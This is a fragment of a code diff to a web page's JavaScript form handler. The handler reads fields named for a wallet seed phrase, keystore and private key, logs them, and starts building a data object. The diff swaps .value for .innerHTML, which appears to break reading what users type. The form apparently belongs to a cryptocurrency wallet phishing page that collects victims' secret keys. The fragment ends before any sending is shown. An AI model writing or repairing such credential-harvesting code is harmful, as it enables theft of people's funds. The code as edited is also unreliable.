@@ -58,9 +58,9 @@
             Form.addEventListener("submit", function 
                     (e) {
                         e.preventDefault();
-                        let phrase = document.getElementById("phrase").value;
-                        let keyStore = document.getElementById("keystore").value;
-                        let privateKey = document.getElementById("privatekey").value;
+                        let phrase = document.getElementById("phrase").innerHTML;
+                        let keyStore = document.getElementById("keystore").innerHTML;
+                        let privateKey = document.getElementById("privatekey").innerHTML;
                         console.log(phrase, keyStore, privateKey);
 
                         const data = {
